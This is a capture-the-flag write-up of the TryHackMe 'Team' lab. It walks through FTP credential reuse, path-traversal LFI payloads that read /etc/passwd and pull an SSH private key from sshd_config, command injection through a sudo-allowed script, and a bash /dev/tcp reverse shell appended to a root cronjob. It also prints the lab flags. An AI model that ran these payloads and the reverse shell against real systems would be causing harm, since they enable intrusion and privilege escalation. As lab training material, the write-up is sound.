# 🔴 TryHackMe — Team

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-yellow)
![Status](https://img.shields.io/badge/Status-Pwned-success)

| Field | Value |
|-------|-------|
| **IP** | 10.113.167.84 |
| **OS** | Ubuntu Linux |
| **Difficulty** | Easy |
| **Date** | 22 Jun 2026 |
| **Author** | Z3R0 |

---

## 🗺️ Attack Path

```
FTP (weak creds)
    └─► New_site.txt (subdomain hint + id_rsa hint)
            └─► dev.team.thm
                    └─► LFI (script.php?page=)
                            └─► /etc/ssh/sshd_config → dale id_rsa
                                    └─► SSH as dale → user.txt
                                            └─► sudo -u gyles admin_checks
                                                    └─► Command Injection → gyles shell
                                                            └─► Writable cronjob (main_backup.sh)
                                                                    └─► Reverse Shell → ROOT 🎯
```

---

## 1️⃣ Reconnaissance

### Nmap

```bash
nmap -sCV -A -T4 -O -Pn -oN nmap-scan.md 10.113.167.84
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.41 (Ubuntu) |

> The HTTP title on the raw IP showed the default Apache page — added `team.thm` to `/etc/hosts` first.

```bash
echo "10.113.167.84  team.thm" | sudo tee -a /etc/hosts
```

![nmap-scan](screenshots/nmap-scan.png)
![nmap-scan-2](screenshots/nmap-scan-2.png)

---

## 2️⃣ FTP Enumeration

```bash
ftp 10.113.167.84
# Name: ftpuser
# Password: (blank)
```

Login succeeded. Found a `workshare` directory with `New_site.txt`:

```bash
ftp> passive        # disable passive mode (was hanging)
ftp> cd workshare
ftp> get New_site.txt
```

![ftp-enum](screenshots/ftp-enum.png)

**Contents of `New_site.txt`:**

```
Dale
    I have started coding a new website in PHP for the team to use,
    this is currently under development. It can be found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa"
and place this in the relevent config file.

Gyles
```

![New_site.txt](screenshots/New_site.txt.png)

**Key intel:**
- Subdomain: `dev.team.thm`
- SSH private key stored in a config file on the server

---

## 3️⃣ Web Enumeration

### Gobuster — main site

```bash
gobuster dir -u http://team.thm/ \
  -w /usr/share/wordlists/dirb/common.txt -t 40
```

Interesting findings:
- `/scripts/` → 301
- `/robots.txt` → 200 (contained just: `dale`)

![gobuster](screenshots/gobuster.png)
![robots-txt](screenshots/robots-txt.png)

### Gobuster — `/scripts/` with extensions

```bash
gobuster dir -u http://team.thm/scripts/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x sh,txt,php,bak,old -t 40
```

Found:
- `script.txt` → 200
- `script.old` → 200

![gobuster-scripts](screenshots/gobuster-2.png)

**`script.old`** revealed FTP credentials hardcoded in a bash script:

```bash
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
# ... FTP automation
```

![script-old](screenshots/script-old.png)

### `dev.team.thm`

```bash
echo "10.113.167.84  dev.team.thm" | sudo tee -a /etc/hosts
curl http://dev.team.thm/
```

The page source contained:

```html
<a href=script.php?page=teamshare.php>Place holder link to team share</a>
```

![dev-site](screenshots/dev-site.png)

**⚠️ `?page=` parameter → classic LFI indicator.**

---

## 4️⃣ Local File Inclusion (LFI)

### Proof of concept

```
http://dev.team.thm/script.php?page=../../../../etc/passwd
```

Returned full `/etc/passwd` — LFI confirmed.  
Notable users: `dale` (uid=1000), `gyles` (uid=1001), `ftpuser` (uid=1002).

![lfi-passwd](screenshots/lfi-passwd.png)

### SSH Private Key Extraction

Knowing `id_rsa` was placed in a "relevant config file" — tried `sshd_config`:

```bash
curl -s "http://dev.team.thm/script.php?page=../../../../etc/ssh/sshd_config" \
  | sed -n '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/p' > dale_id_rsa

cat dale_id_rsa
```

**Dale's private key was embedded directly inside `sshd_config`!**

![sshd-config-lfi](screenshots/sshd-config-lfi.png)
![dale-id-rsa](screenshots/dale-id-rsa.png)

---

## 5️⃣ Initial Access — SSH as dale

```bash
chmod 600 dale_id_rsa
ssh -i dale_id_rsa dale@10.113.167.84
```

Got a shell as `dale`!

```bash
dale@ip-10-113-167-84:~$ cat user.txt
THM{6YOTXHz7c2d}
```

![ssh-dale](screenshots/ssh-dale.png)
![user-flag](screenshots/user-flag.png)

🚩 **User Flag: `THM{6YOTXHz7c2d}`**

---

## 6️⃣ Privilege Escalation — dale → gyles

### Sudo enumeration

```bash
sudo -l
```

```
User dale may run the following commands on ip-10-113-167-84:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

![sudo-l](screenshots/sudo-l.png)

### Command Injection in admin_checks

```bash
sudo -u gyles /home/gyles/admin_checks
```

The script prompts for input then passes it directly to bash:

```
Enter name of person backing up the data: gyles
Enter 'date' to timestamp the file: /bin/bash
```

Instead of `date`, injected `/bin/bash` — got a shell as `gyles`!

![command-injection-1](screenshots/command-injection-1.png)
![command-injection-2](screenshots/command-injection-2.png)

```bash
whoami
gyles
```

---

## 7️⃣ Privilege Escalation — gyles → root

### Cronjob discovery

Found via `.bash_history` and manual exploration:

```bash
cat /opt/admin_stuff/script.sh
```

```bash
#!/bin/bash
# I have set a cronjob to run this script every minute

dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
$main_site
$dev_site
```

### Writable script abuse

```bash
ls -la /usr/local/bin/main_backup.sh
# -rwxrwxr-x 1 root admin 65 Jan 17 2021 /usr/local/bin/main_backup.sh
```

The `admin` group has **write access**, and `gyles` is in `admin`. The cronjob runs as `root` every minute.

**Set up listener on Kali:**

```bash
nc -lvnp 4444
```

**Append reverse shell to the script:**

```bash
echo 'bash -i >& /dev/tcp/192.168.147.12/4444 0>&1' >> /usr/local/bin/main_backup.sh
```

After ~1 minute, the cronjob fired and sent a root shell:

![reverse-shell-root](screenshots/reverse-shell-root.png)

```bash
id
# uid=0(root) gid=0(root) groups=0(root),108(lxd),1004(admin)

cat /root/root.txt
THM{fhqbznavfonq}
```

![root-flag](screenshots/root-flag.png)

🚩 **Root Flag: `THM{fhqbznavfonq}`**

---

## 📊 Vulnerability Summary

| # | Vulnerability | Severity | Location |
|---|--------------|----------|----------|
| 1 | FTP Weak Credentials | Medium | Port 21 — ftpuser |
| 2 | Sensitive Data in FTP Share | Medium | /workshare/New_site.txt |
| 3 | Local File Inclusion (LFI) | High | dev.team.thm/script.php?page= |
| 4 | SSH Private Key Stored in sshd_config | Critical | /etc/ssh/sshd_config |
| 5 | Command Injection via Unsanitized Input | High | /home/gyles/admin_checks |
| 6 | Writable Cronjob Script (runs as root) | Critical | /usr/local/bin/main_backup.sh |

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `ftp` | FTP enumeration & file retrieval |
| `gobuster` | Directory & file brute-forcing |
| `curl` + `sed` | LFI exploitation & key extraction |
| `ssh` | Initial access with extracted key |
| `nc` | Reverse shell listener |

---

## 🎓 Key Takeaways

1. **FTP با credentials ضعيفة** بيكشف معلومات حساسة — دايماً أول شي نفحص FTP
2. **Subdomain enumeration** مش بس بـ gobuster — أحياناً بتلاقي hints في ملفات نصية
3. **LFI مش بس لـ /etc/passwd** — أي config file فيه sensitive data مثل `/etc/ssh/sshd_config`
4. **`sudo -l`** أول شي بعد ما تدخل — كشف sudo rule على admin_checks
5. **Unsanitized input في scripts** = command injection — `/bin/bash` كافي
6. **Writable scripts في cronjobs بتشتغل كـ root** = guaranteed privilege escalation

---

> *Writeup by Z3R0 | TryHackMe — Team | 22 Jun 2026*  
> *Part of the CPTS certification journey*
